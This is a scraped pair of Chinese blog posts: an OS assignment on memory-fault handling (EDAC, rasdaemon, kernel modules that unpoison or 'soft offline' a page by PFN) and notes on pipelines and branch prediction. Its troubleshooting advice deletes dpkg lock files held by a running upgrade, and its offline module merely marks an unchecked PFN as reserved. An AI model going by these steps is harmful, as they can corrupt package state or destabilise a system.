MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;Your Name\u0026#34;); MODULE_DESCRIPTION(\u0026#34;A simple module to unpoison a memory page\u0026#34;); 编译和加载内核模块\n保存代码为 unpoison_page.c。\n创建一个 Makefile：\n1 2 3 4 5 6 7 obj-m += unpoison_page.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean 编译内核模块\n1 make 加载内核模块，并传递需要恢复的 PFN（从之前获取的 PFN）：\n1 sudo insmod unpoison_page.ko pfn=0x12345 验证内核日志\n通过 dmesg 命令查看内核日志，确认内存页是否已恢复：\n1 2 dmesg | grep poison [ 1234.567890] Unpoisoning page at PFN: 0x12345 EDAC EDAC (Error Detection and Correction) 是一种硬件和软件结合的技术，用于检测和纠正计算机内存中的错误。它特别适用于服务器和其他高可靠性计算环境。EDAC 通过检测内存中的错误并在可能的情况下自动纠正这些错误，帮助确保系统稳定性和数据完整性。\nEDAC 的主要功能 错误检测： EDAC 能够检测内存中的错误，例如单比特错误（Single-Bit Errors，SBE）和多比特错误（Multi-Bit Errors，MBE）。 错误纠正： 对于单比特错误，EDAC 通常能够自动纠正。 对于多比特错误，EDAC 会记录错误并发出警告，提醒管理员采取进一步行动。 错误报告： EDAC 会记录并报告检测到的内存错误，提供详细的错误信息，包括错误类型、发生时间和位置等。 硬件支持：依赖于硬件，通常需要支持ECC（Error Correction Code）内存或其他类型的错误检测和纠正机制。 EDAC-util的使用(EDAC-utils已经被弃用) 1、确认系统支持 EDAC：\n确保你的硬件和操作系统支持 EDAC。现代的服务器和一些高端工作站通常支持 ECC（Error-Correcting Code）内存，这是 EDAC 功能的基础，下面检测电脑是否支持ECC内存 1 2 3 4 5 6 7 8 9 10 11 12 13 root@ecs-c7f5:~# dmidecode -t memory # dmidecode 3.4 Getting SMBIOS data from sysfs. SMBIOS 2.8 present. Handle 0x1000, DMI type 16, 23 bytes Physical Memory Array Location: Other Use: System Memory Error Correction Type: Multi-bit ECC Maximum Capacity: 16 GB Error Information Handle: Not Provided Number Of Devices: 1 查询系统所支持的EDAC模块，选择与机器硬件所适配的EDAC模块安装。 1 2 3 4 5 hacker@ubuntu:~/Desktop$ ls /lib/modules/{对应的内核版本}/kernel/drivers/edac/ amd64_edac.ko i3000_edac.ko i5400_edac.ko ie31200_edac.ko skx_edac.ko e752x_edac.ko i3200_edac.ko i7300_edac.ko igen6_edac.ko x38_edac.ko edac_mce_amd.ko i5000_edac.ko i7core_edac.ko pnd2_edac.ko i10nm_edac.ko i5100_edac.ko i82975x_edac.ko sb_edac.ko 2、加载EDAC模块：\n在现代的Linux内核中，EDAC模块通常已经包含在内核中。你可以通过以下命令加载相应的模块：\n1 sudo modprobe i7core_edac 3、安装和配置 EDAC 工具：\n在 Linux 系统上，可以使用 edac-utils 来管理和监控 EDAC。安装方法如下\n1 sudo apt-get install edac-utils 4、检查 EDAC 状态：\n使用以下命令检查 EDAC 状态：\n1 sudo edac-util --status 5、模拟内存错误：\n在没有实际硬件支持的情况下，模拟内存错误是比较困难的。一般情况下，可以通过修改内核参数或使用一些专门的工具来模拟内存错误。以下是一些可能的方法： 通过内核调试功能： 有些系统允许通过内核调试功能来插入内存错误。这通常需要编写内核模块或者使用一些内核调试工具。 使用内存测试工具： 像 memtest86+ 这样的工具可以用于测试内存是否存在错误，但它们通常不会主动模拟错误。 6、验证 EDAC 的工作：\n在模拟内存错误后，可以通过 dmesg 命令查看内核日志，确认 EDAC 是否检测到错误并进行纠正。例如：\n1 dmesg | grep -i edac Rasdaemon(目前主流的检错纠错工具) Rasdaemon (Reliability, Availability, and Serviceability daemon) 是一个开源的系统服务，用于捕获和报告硬件错误事件，特别是与内存、处理器和其他关键硬件相关的错误。它支持 Linux 系统，能够监控和记录硬件错误，提供详细的错误信息，有助于系统管理员进行诊断和故障排除。Rasdaemon 利用硬件提供的错误报告机制，通过内核事件追踪 (kernel trace) 系统收集硬件错误事件。\nRasdaemon 的主要功能 错误监控和报告： 捕获和记录内存错误、处理器错误、PCIe 错误等。 提供详细的错误信息，包括错误类型、发生时间、位置等。 与 EDAC 集成： 兼容 EDAC (Error Detection And Correction) 框架，能够捕获内存控制器错误。 数据持久性： 将错误事件持久化存储到数据库中，便于后续分析。 用户空间工具： 提供用户空间工具，用于查询和分析错误数据。 Rasdaemon 的使用（需要EDAC支持） 1、安装rasdaemon\n1 sudo apt install rasdaemon 2、配置rasdaemon\n启动rasdaemon 1 2 3 4 5 root@ecs-c7f5:~# rasdaemon --enable rasdaemon: ras:mc_event event enabled rasdaemon: ras:aer_event event enabled rasdaemon: mce:mce_record event enabled rasdaemon: ras:extlog_mem_event event enabled 需要启动两个systemd服务: ras-mc-ctl.service 和 rasdaemon.service : 1 2 3 4 5 6 7 root@ecs-c7f5:~# systemctl enable ras-mc-ctl.service root@ecs-c7f5:~# systemctl enable rasdaemon.service root@ecs-c7f5:~# systemctl start ras-mc-ctl.service root@ecs-c7f5:~# systemctl start rasdaemon.service Synchronizing state of rasdaemon.service with SysV service script with /lib/systemd/systemd-sysv-install. Executing: /lib/systemd/systemd-sysv-install enable rasdaemon 3、检查 rasdaemon 状态\n1 2 3 systemctl status rasdaemon systemctl status ras-mc-ctl 输出信息:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # rasdaemon 服务状态 ● rasdaemon.service - RAS daemon to log the RAS events Loaded: loaded (/usr/lib/systemd/system/rasdaemon.service; enabled; vendor preset: disabled) Active: active (running) since Tue 2023-11-28 11:22:16 CST; 5s ago Process: 181029 ExecStartPost=/usr/sbin/rasdaemon --enable (code=exited, status=0/SUCCESS) Main PID: 181014 (rasdaemon) Memory: 8.0M CGroup: /system.slice/rasdaemon.service └─181014 /usr/sbin/rasdaemon -f -r Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Enabled event ras:aer_event Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Family 6 Model 55 CPU: only decoding architectural errors Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: mce:mce_record event enabled Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Enabled event mce:mce_record Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: ras:extlog_mem_event event enabled Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: Enabled event ras:extlog_mem_event Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording mc_event events Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording aer_event events Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording extlog_event events Nov 28 11:22:16 alipay-srm011233163091.et15 rasdaemon[181014]: rasdaemon: Recording mce_record events # ras-mc-ctl 服务状态 ● ras-mc-ctl.service - Initialize EDAC v3.0.0 Drivers For Machine Hardware Loaded: loaded (/lib/systemd/system/ras-mc-ctl.service; enabled; vendor preset: enabled) Active: active (exited) since Tue 2023-11-28 11:31:22 CST; 9min ago Main PID: 2772415 (code=exited, status=0/SUCCESS) CPU: 53ms Nov 28 11:31:22 zcloud.staging.huatai.me systemd[1]: Starting Initialize EDAC v3.0.0 Drivers For Machine Hardware... Nov 28 11:31:22 zcloud.staging.huatai.me ras-mc-ctl[2772415]: ras-mc-ctl: Error: No dimm labels for HP model ProLiant DL360 Gen9 Nov 28 11:31:22 zcloud.staging.huatai.me systemd[1]: Finished Initialize EDAC v3.0.0 Drivers For Machine Hardware. 这里有一个错误提示: ras-mc-ctl: Error: No dimm labels for XXXX ，实际上在各种服务器上初始时都能看到，需要进一步配置。\n4、检查EDAC信息（如果使用ECC内存）： 可以使用ras-mc-ctl工具（通常包含在rasdaemon包中）来检查详细的EDAC信息：\n1 sudo ras-mc-ctl --status 1 ras-mc-ctl --layout 5、使用rasdaemon\n在后台运行rasdaemon，直接输入rasdaemon就行。 1 rasdaemon 在前台运行rasdaemon，此时输出显示 rasdaemon 初始化并监听事件，此时就可以等待出现的硬件异常。 1 rasdaemon -f 如果希望同时将错误记录到数据库(编译时使用了参数 --enable-sqlite3)，则可以增加一个 -r 参数:\n1 rasdaemon -f -r 配置 DIMM labels\nras-mc-ctl 是RAS内存控制器管理工具，用于执行一些针对EDAC(Error Detection and Correction)驱动的RAS管理任务。\nras-mc-ctl 可以查询检测到的错误，例如 --error-count 可以获取主机错误计数:\nras-mc-ctl 使用 --error-count 获取错误计数\n1 2 3 4 5 6 # ras-mc-ctl --error-count Label CE UE mc#0csrow#2channel#0 0 0 mc#0csrow#2channel#1 0 0 mc#0csrow#3channel#1 0 0 mc#0csrow#3channel#0 0 0 使用 ras-mc-ctl 打印出被记录的所有错误。\n1 2 3 4 5 6 7 8 9 10 11 12 13 # ras-mc-ctl --summary Memory controller events summary: Corrected on DIMM Label(s): \u0026#39;DIMM_B1\u0026#39; location: 0:2:0:-1 errors: 5 PCIe AER events summary: 1 Uncorrected (Non-Fatal) errors: BIT21 No Extlog errors. No devlink errors. Disk errors summary: 0:0 has 6646 errors No MCE errors. 利用Rasdaemon实现错误内存的软下线 由于缺乏ecc内存，导致edac模块无法正常运行，所以rasdaemon也无法正常捕获到错误，因此我们只做了对指定页面的软下线。\n使用 Rasdaemon 监控和处理错误\nRasdaemon 会自动监控和记录内存错误，并在检测到内存错误时，尝试对相关页面进行软下线。\n1 sudo ras-mc-ctl --errors | grep \u0026lt;error_address\u0026gt; 检查日志\n你可以查看 Rasdaemon 生成的日志，以确认内存错误和软下线事件：\n1 2 sudo ras-mc-ctl --summary sudo journalctl -u rasdaemon 编写内核模块对页面进行软下线\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/mm.h\u0026gt; #include \u0026lt;linux/mmzone.h\u0026gt; #include \u0026lt;linux/pfn.h\u0026gt; static unsigned long target_pfn = 0x12345; // 替换为你要下线的页框号 static int __init soft_offline_page_init(void) { struct page *page; unsigned long flags; int ret = 0; pr_info(\u0026#34;Soft offline page at PFN %lu\\n\u0026#34;, target_pfn); page = pfn_to_page(target_pfn); if (!PageReserved(page)) { // 获取所在的内存区域（zone） struct zone *zone = page_zone(page); spin_lock_irqsave(\u0026amp;zone-\u0026gt;lock, flags); SetPageReserved(page); spin_unlock_irqrestore(\u0026amp;zone-\u0026gt;lock, flags); pr_info(\u0026#34;Page at PFN %lu successfully offlined\\n\u0026#34;, target_pfn); } else { pr_warn(\u0026#34;Page at PFN %lu is already reserved, cannot offline\\n\u0026#34;, target_pfn); ret = -EBUSY; } return ret; } static void __exit soft_offline_page_exit(void) { pr_info(\u0026#34;Module unloaded\\n\u0026#34;); } module_init(soft_offline_page_init); module_exit(soft_offline_page_exit); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;Lijun\u0026#34;); MODULE_DESCRIPTION(\u0026#34;Soft offline specified page frame number\u0026#34;); 问题汇总： 1、apt install 报错\n1 2 3 4 hacker@ubuntu:~/Desktop$ sudo apt-get install edac-utils E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 4700 (unattended-upgr) N: Be aware that removing the lock file is not a solution and may break your system. E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it? 解决方法：删除锁定文件\n在某些情况下，根本原因可能是锁文件。锁文件阻止两个或多个进程访问相同的数据。当您运行 apt 或 apt-get 命令时，通常会创建一个锁文件。但是，如果最新的 apt 命令没有成功执行(即突然终止)，锁文件将继续存在并阻止任何后续的 apt 或 apt-get 实例。\n解决 “Could not get lock /var/lib/apt/lists/lock”错误\n1 $ sudo rm /var/lib/apt/lists/lock 解决 “Could not get lock /var/lib/dpkg/lock”错误\n1 $ sudo rm /var/lib/dpkg/lock 其他时候，您可能会遇到 “/var/lib/dpkg/lock-frontend error”的错误。这意味着当前正在运行使用 APT / DPKG 的图形应用程序，这可能是使用 Gdebi 或 Synaptic 包管理器造成的。\n即时的补救措施是退出或关闭程序，并再次尝试。如果没有效果，可是尝试删除 /var/lib/dpkg/lock-frontend 文件。\n1 $ sudo rm /var/lib/dpkg/lock-frontend 删除 lock-frontend 文件可能会再次导致“Could not get lock /var/lib/dpkg/lock”错误，因此，您将不得不继续删除相关锁定文件。\n1 $ sudo rm /var/lib/dpkg/lock 如果您碰巧会出现有关 apt-cache lock 的错误，例如 /var/cache/apt/archives/lock，请删除相关锁定文件。\n1 2 $ sudo rm /var/cache/apt/archives/lock $ sudo rm /var/lib/dpkg/lock 2、edac-util无法使用\n1 2 hacker@ubuntu:~/Desktop$ edac-util -v edac-util: Error: No memory controller data found. 原因可能是我的电脑不支持ecc()，一般来说内存条的Datawidth比Totalwidth小才支持ecc。在Windows下运行以下命令可查看是否支持ecc，Linux下可用sudo dmidecode -t memory命令查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #Windows下 C:\\Users\\L\u0026gt;wmic memorychip get datawidth,totalwidth DataWidth TotalWidth 64 64 #Linux下 hacker@ubuntu:~/Desktop$ sudo dmidecode -t memory # dmidecode 3.2 Getting SMBIOS data from sysfs. SMBIOS 2.7 present. Handle 0x0084, DMI type 5, 46 bytes Memory Controller Information Error Detecting Method: None Error Correcting Capabilities: None 相关知识 Error correction code (ECC) 纠错码 （ECC） 是一种用于检测和纠正由于环境干扰和物理缺陷导致的内存数据错误的机制。ECC 内存用于无法容忍因数据损坏而导致故障的高可靠性应用，例如医疗设备、飞机控制系统或银行数据库服务器。\n大多数内存错误是由软错误（例如宇宙射线、α 射线、电磁干扰）引起的单个（1 位）错误，但有些可能是由于硬件故障（例如行锤故障）引起的。对于在较高高度运行的系统（例如商用飞机）而言，软错误更为普遍。据说，在大约10公里的高度，诱导宇宙射线的比特误差要高出300倍。\n这种单位错误可以通过ECC存储器系统来纠正。多位错误也可以被检测和/或纠正，这取决于错误符号的数量。\n内存错误的症状包括数据损坏、系统崩溃和/或安全漏洞，使非特权代码能够访问内核。众所周知，内存错误是导致大型数据中心机器崩溃的最常见硬件原因之一。\nEDAC和Rasdaemon的关系 EDAC（Error Detection and Correction）和 rasdaemon 在功能上有密切的关系，rasdaemon 是一个用户空间的工具，用于收集和记录由内核的EDAC子系统以及其他硬件错误检测子系统报告的错误。\n具体来说：\nEDAC 子系统：这是Linux内核中的一个模块，专门用于检测和报告ECC（Error-Correcting Code）内存错误。EDAC能够捕捉和记录内存错误信息，如可纠正错误（CE，Correctable Errors）和不可纠正错误（UE，Uncorrectable Errors）。 rasdaemon：这是一个用户空间的守护进程，利用内核中的RAS（Reliability, Availability, and Serviceability）功能来收集和记录硬件错误，包括内存错误、CPU错误、PCIe错误等。rasdaemon 可以从内核的EDAC子系统获取内存错误数据，并将这些数据记录到系统日志或数据库中，便于进一步分析和监控。 以下是EDAC和rasdaemon的工作流程：\n硬件错误检测：当ECC内存检测到错误时，EDAC子系统会捕获这些错误并记录下来。 错误上报：EDAC子系统将错误信息上报给内核日志系统。 错误收集：rasdaemon 作为用户空间的工具，从内核日志系统中收集这些错误信息。 错误记录和报告：rasdaemon 将收集到的错误信息记录到系统日志中，并且可以选择将这些信息存储在数据库中或通过其他方式进行报告。 参考资料： EDAC 诊断系统硬件故障 — Cloud Atlas beta 文档 (cloud-atlas.readthedocs.io)\n服务器内存故障预测居然可以这样做！ - vivo互联网技术 - 博客园 (cnblogs.com)\nError Detection And Correction (EDAC) Devices — The Linux Kernel documentation\nnotes/kernel/hwpoison.md at master · wangxiaoq/notes (github.com)\nhwpoison — The Linux Kernel v4.20.0 文档 (kernel-doc.readthedocs.io)\nhwpoison — The Linux Kernel documentation\nLinux EDAC modules on Server Systems - ION Server Blog (ioncomputer.com)\nMemTest86 - ECC Technical Details\nmchehab/rasdaemon)\n","date":"2024-06-05T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%A7%E4%BD%9C%E4%B8%9A%E5%86%85%E5%AD%98%E6%95%85%E9%9A%9C%E6%A3%80%E6%B5%8B%E5%92%8C%E5%A4%84%E7%90%86/os_hu10143853259001966716.jpg","permalink":"https://chenyuan1125.github.io/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%A7%E4%BD%9C%E4%B8%9A%E5%86%85%E5%AD%98%E6%95%85%E9%9A%9C%E6%A3%80%E6%B5%8B%E5%92%8C%E5%A4%84%E7%90%86/","title":"操作系统大作业：内存故障检测和处理"},{"content":"计算机体系结构课程笔记 一、流水线 1.1RISC处理器的五段流水线 RISC指令集执行的五个周期\n周期 名称 操作 1 IF (Instruction fetch) •发送PC到内存单元，取回下一条指令；\n•更新PC=PC+4，为取下一条指令做准备。 2 ID (Instruction decode/register fetch) •根据指令中的源操作数标识符，从寄存器文件中读取源操作数；\n•对读取的源操作数进行比较，以为可能的跳转做准备； •对指令中的偏移量进行符号扩展，以防可能用到\n•计算可能的跳转目的地址。 3 EX (Execution/effective address) •对于访存指令：将基址寄存器和偏移量相加形成访存地址；\n•寄存器-寄存器运算指令：对读取的2个源操作数执行指定操作； •寄存器-立即数运算指令：对读取的第一个源操作数和立即数执行指定的操作。\n•分支指令：判断是否跳转，若成功，则把转移目标地址送至PC。 4 MEM (Memory access) •Load：使用前一个周期计算出的访存地址读取内存； •Store：将数据写入由前一个周期计算出的访存地址指向的内存。 5 WB\n(Write back) •对于寄存器-寄存器运算指令和load指令：将结果写入寄存器文件。 注意：寄存器可以在ID和WB阶段同时分别进行读和写，因为它的读写分成了两个部分\n关于分支指令：\nRISC指令集的分支指令需要三个时钟周期。\nMIPS指令集的分支指令未改进前需要四个时钟周期，改进后只需两个时钟周期，在ID段增加一个加法器，并且将分支判断和目标结果提前到ID/EX站前\n减少流水线分支指令的损失还可以通过stall，分支预测，延迟分支(延迟槽)\n1.2冲突（hazards） 依赖分类\n数据依赖（data dependency）：指令之间有数据流动，也叫真依赖 名字依赖（name dependency）：两条指令使用相同的寄存器或引用了相同的内存位置 antidependency反向依赖 output dependency输出依赖 控制依赖（control dependency）：主要是分支指令对后续指令的影响 冲突分类\n结构冲突（structural hazards）：硬件无法支撑并发指令的各种可能组合，资源部件不够。\n解决办法：\n停顿 数据冲突（data hazards）\nRAW（read after write）本来是先写后读，读取写入后的值，但先读后写了，读了写入前的值。对应于数据依赖 WAW（write after write）写后写，但本来先写入的值变成了后写入的值。对应于输出依赖 WAR（wirte after read）先读后写，读取写入前的值，但先写后读了，读了写入后的值。对应于反向依赖 WAW/WAR冲突只会在乱序执行流水线中出现，WAW能出现在复杂流水线中，但WAR只出现在动态调度的乱序流水线中，因为复杂流水线仍是静态流水线，所有指令都是按序发射的，不可能存在后一条指令执行完毕了，前一条指令还未读取操作数\n解决办法\n前送（forwarding/bypassing） 计分板（scoreboarding） Tomasulo 控制冲突（control hazards）：分支指令带来的PC取值的不确定性\n解决办法\n延迟槽（delayed slot） 分支预测（branch prediction） 高级分支预测（correlating branch predictors, tournament predictors） 跳转地址预测（branch target buffers) 返回地址预测（return address predictors） 加速比的计算：\n$Speedup=Pipeline depth/(Ideal CPI+Structural stalls+Data hazard stalls+Control stalls)$\n1.3 MIPS流水线实现 1.4 复杂流水线 1.5 动态调度流水线 什么是静态调度流水线？\n​\t就是完全依赖编译器执行指令调度、硬件完全按照程序顺序（program order）发射指令的流水线。这种流水线中，一旦有指令因资源冲突或数据依赖而停顿，后续指令都不允许发射，即使它们完全不依赖于流水线中的任何指令，如前面所提到的调度。\n静态调度流水线所存在的问题\n对编译器开发人员的要求太高 有些依赖关系编译时无法确定 编译器的通用性太差 代码的通用性太差 受cache miss影响太大 动态调度的核心思想\n乱序执行 ID阶段按序执行，并将ID阶段分为两个阶段： Issue阶段：对应之前的ID阶段，但精简操作，只做最必要的事：如指令译码、资源冲突检测 Read operands阶段：等待数据冲突消除，然后读取操作数 动态调度流水线中所有类型的冲突都存在\n1.6 计分板算法 算法的核心是一个计分板，它记录着所有必要的信息，用来控制以下事情：\n每条指令何时可以读取操作数并投入运行（对应着RAW冲突的检测） 每条指令何时可以写入结果（对应着WAR冲突的检测） WAW冲突在issue阶段检测，还是会导致整个流水线的停顿。\n指令执行的四个阶段\n阶段 操作 Issue 如果指令所需的功能部件空闲，并且与已执行的指令没有相同的目标寄存器，计分板发射指令到功能部件，并更新内部数据结构。 （WAW冲突） Read operands 计分板检测源操作数是否可用，是否等待前面指令写入。当源操作数可用时，计分板通知功能部件执行，从寄存器中读取操作数，并开始执行。 （RAW冲突） Execute 功能部件在接收到操作数之后开始执行，执行完成出结果后通知计分板。 Write result 计分板知道功能部件执行完成后，检查WAR冲突，如果有必要还需stall当前指令。（WAR冲突） 缺点：\n计分板算法没有处理控制冲突，乱序执行仅局限在一个基本块内 没有消除WAR/WAW冲突，这些冲突仍会导致停顿 1.7 寄存器重命名(Tomasulo算法) 核心思想：通过寄存器重命名，可彻底消除WAR/WAW冲突.\n每个功能部件有自己的保留站 保留站中的每一行保存着一条发射到相应功能部件的指令，并缓存了已就绪的操作数，和未就绪操作数的标签（即生产指令所在的保留站行号） CDB(common data bus)不仅把结果送到寄存器中，也送到所有正在等待该结果的保留站中 每个结果会附带一个标签（即生产指令所在的保留站行号），用来和保留站中的标签相匹配 CDB相当于实现了前送功能 阶段 操作 Issue 取出下一条指令，检查资源冲突（即是否还有空闲的保留站），并在有空闲保留站时，将指令连同就绪的操作数发射到一个空闲的保留站中（对于未就绪的操作数，在保留站中记录生产指令所在的保留站编号），否则停顿当前及后续指令的发射。（WAR，WAW） Execute 监控CDB，等待所有操作数均就绪，然后开始执行该指令。 •Load/store指令的执行分为两个步骤：1）计算访存地址（各指令按照程序顺序执行这一步，以防止通过内存发生的数据冲突）；2）访问内存（对于load指令），或者等待要写入内存的操作数（对于store指令）。 •为了保证精确例外，任何指令都必须等待前面的分支指令执行完毕后才能开始执行。（RAW） Write result 当结果产生后，将其连同标签（即生产指令的保留站编号）广播到CDB上，进而写入寄存器文件和所有需要它的保留站和store buffer中。 •Store指令在这一阶段访问内存。 缺点：\n仍没有处理控制冲突，乱序执行仍局限在一个基本块内 1.8 猜测执行 核心思想：为了解决跳转条件及目的地址的计算出结果太晚的问题，提前对跳转指令及目的地址的结果做预测，假设预测正确并直接从预测的目的地址开始取指，就好像这条分支指令不存在一样，为了避免预测错误所造成的影响，指令执行完毕后，先不更新寄存器和内存，而是暂存在一个缓冲区内，直到能够确定预测结果是否正确。\n暂存指令结果的缓冲区称为Reorder Buffer(ROB)；Write Result调整为向ROB写入 Write Result后面需要增加一个阶段，用来等待分支结果并真正更新寄存器，称为Commit阶段 ROB也是数据源之一：保存在ROB中的结果数据需要前送给后续指令 ROB中的结果是按照程序顺序Commit的 猜测错误时，通过清除ROB中的相关条目进行回滚 与Tomasulo算法的结构基本相同，区别主要有四点：\n引入了Reorder Buffer CDB不再直接写寄存器文件，而是写入到ROB中 保留站不仅从寄存器文件中读取源操作数，也从ROB中读取 取消了Store Buffer（其功能改由ROB承担） CDB上的数据标签有变化 生产指令的保留站编号-\u0026gt;生产指令的ROB编号 保留站数据结构有变化 需要增加一个字段，记录与之关联的ROB编号，作为将来放置到CDB上的数据标签 阶段 操作 Issue 1）从指令队列取出下一条指令 2）分配一个空闲的保留站和ROB（如果没有则停顿整个流水线）\n3）将指令信息填入所分配的保留站和ROB\n4）从寄存器文件或ROB中读取已就绪的操作数，放入保留站中，或在保留站中记录未就绪的操作数所在的ROB编号 Execute 监控CDB，等待所有操作数均就绪，然后开始执行该指令。\n•Load指令的执行仍分为两个步骤：1）计算访存地址；2）访问内存 •Store指令只需要计算访存地址 •Load/store指令仍按照程序顺序计算访存地址 Write result •对于store指令：监控CDB，等待要写入内存的数据，收到后将其写入自身ROB，并释放保留站 •对于其它指令，等待结果产生，将其连同标签（即生产指令的ROB编号）广播到CDB上，进而写入对应ROB和所有需要它的保留站，最后释放保留站 Commit 等待此指令到达ROB队列头部，然后根据指令类型分别处理： •对于分支指令：如果预测正确，释放ROB即可，否则清空所有其它ROB和保留站（相当于放弃所有猜测执行的指令） •对于store指令：更新内存，并释放ROB •对于其它指令：更新寄存器文件，并释放ROB WAR/WAW：不存在\n当一条store指令提交时，所有前序指令均已提交完毕，不可能存在尚未完成读取的load指令，也不可能存在尚未完成写出的store指令 RAW：可能存在\nLoad指令在进入Execute阶段第二步之前，需要确认ROB中不存在指向相同内存位置的前序store指令 猜测执行的代价\n因预测错误导致本不该执行的指令被实际的执行了，带来了无用功耗\n对不该执行的指令进行回滚，也需要消耗时间和功耗\n处理猜测执行的指令导致的例外，也可能会引入不必要的开销\n代价的度量：misspeculation（因猜测错误导致的本不该执行的指令所占的比例）\n疑问：\n为什么第一条load进入Commit阶段，也就是在Write Back阶段完成后，第二条load才能进入execute阶段？\n1.9 分支预测 （1）静态预测\n​\t要进行分支预测，就要预测分支跳还是不跳。最朴素的想法是预测一直跳或者一直不跳，这样的方法虽然简单，但是也比完全不预测要高明。完全不预测是100%地要阻断流水线，而预测一直跳或者预测一直不跳还有机会预测对，预测到就是赚到。预想一个1000次的for循环，这个循环前999次都是跳转而最后一次不跳转，如果处理器设置为预测一定跳转，那么在执行这段指令的时候其准确率高达99.9%，性能远远高于不做预测的处理器。\n​\t基于量化研究方法的思想，HP在他们的著作中说当前世界上大概有20%的代码是分支指令，其中跳转和不跳转的比例是1：1 。把这个数据代入到上一段说的预测方法中去，处理器的CPI = 0.8 + 0.1 × 1 + 0.1 × 4 = 1.3 *，*效果显著优于完全不做预测的机器。\n​\t在上面的基础上略加思考，我们发现很多分支指令是有规律的，比如for代码段的最后一条分支指令，这条分支指令绝大部分时间是向后跳转的，而for代码又总是出现，因此提出这么一个方法：向后跳转的分支总是执行，向前跳转的分支总是不执行。这样的假设是基于实际代码情景的，事实证明这样做的效果不错。\n（2）根据最后一次结果进行预测\n​\t静态分支预测的方法虽然比不预测要好，但是性能并不能让人满意。比如预测一定跳转，如果碰到分支指令执行情况为NNNNNN（N表示Not taken，不分支），那么错误率就高达100%，这样的情况是有可能发生的。静态就意味着不灵活，我们需要灵活一些的方法来解决问题，灵活的方法可繁可简，简单的方法就是根据上一次分支指令的执行情况来预测当前分支指令，如果上一次指令不跳转，那么下一次碰到这条指令就预测不跳转，用这个方法来预测NNNNNN的话，正确率可能高达100%，这样的结果让人满意。\n（3）基于两位饱和计数器的预测\n​\t根据最后一次结果进行预测确实有一些效果，但是当它碰到TNTNTN这样的情况，正确率又可能会下降到0%，还不如静态预测，静态预测还可能有50%及以上的正确率。\n既要满足NNNNNN这样的情况，又要让TNTNTN这样的情况的结果不至于太难看，解决的办法是基于两位饱和计数器的预测。两位饱和计数器用一个状态机来表示，状态机如下图。\n​\t两位饱和计数器包含四个状态：00、01、10、11 。其中00、01表示不跳转，10、11表示跳转。00表示强不跳转，当计数器处于这个状态，分支预测不跳转，如果预测正确，计数器保持计数值，如果预测错误，那么状态转换成01，即弱不跳转，此时仍然预测分支不跳转，如果预测正确，状态转变回00，如果预测错误，状态转变为弱跳转10。在弱跳转10的状态下，分支预测跳转，如果预测正确，状态转变为强跳转11，如果预测错误，状态转变为弱不跳转01.在强跳转11的状态下，分支预测跳转，如果预测正确，状态保持不变，如果预测错误，状态转变为弱跳转10.\n​\t上述的两位饱和计数器只是一种预测方法，其他的预测方法包括修改两位计数器的状态转移情况、增大计数器位数，对于两位饱和计数器自身而言，我们也可以通过设置不同的初始状态来区别别的两位饱和计数器。\n（4）基于局部历史的分支预测\n（5）基于全局历史的分支预测\n（6）竞争的分支预测\n详细参考博客：\n分支指令与分支预测_Zkaisen的博客-CSDN博客\nhttps://zhuanlan.zhihu.com/p/490749315\n精确例外\n指在处理例外的时候，发生例外指令之前所有的指令都已经执行完了，例外指令后面的所有指令都还没执行。\n参考博客：[计算机体系结构——精确例外 \u0026amp; ROB详解 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/586221956#:~:text=上一篇文章提到的Tomasulo算法，是一个非精确的例外，也就是说一旦发生例外，硬件就很难处理，因为是乱序执行，怎么才能给软件一个干净的现场呢？ 所以操作系统就希望动态流水线提供精确例外。,精确例外 ：指在处理例外的时候，发生例外指令之前所有的指令都已经执行完了，例外指令后面的所有指令都还没执行。)\n2-位预测器：仅利用分支指令自身的历史行为来预测它的未来行为 关联预测器：综合考虑不同分支指令的历史行为来进行预测 (m, n)关联预测器：利用m个最近执行的分支指令的行为，从2^m个n-bit预测器中选择一个，用来对当前分支指令进行预测 2-bit预测器实际上是一个（0, 2）预测器 锦标赛预测器 设置两个预测器，一个使用全局历史进行预测，一个使用局部历史进行预测，再设置一个选择器，用来决定具体使用哪个预测器来对当前分支指令进行预测 全局预测器：使用最近12个分支的跳转情况作为索引，查找一个4096入口的全局预测器，每个入口都是一个标准的2位预测器 局部预测器：分为两层，上面一层是一个1024入口的局部历史记录表，用PC最低10位作为索引，每个入口记录着相应分支最近10次的跳转情况；下面一层是一个1024入口的3位预测器，用上层检索出的10位局部历史索引 选择器：是一个4096入口的2位预测器，用PC最低12位作为索引。预测器的当前取值决定了是采用全局预测器的结果，还是采用局部预测器的结果. 返回地址预测器 通常用栈来实现 Call指令执行时，将返回地址push到栈中 Ret指令执行时，从栈中pop一个返回地址，作为predicted PC 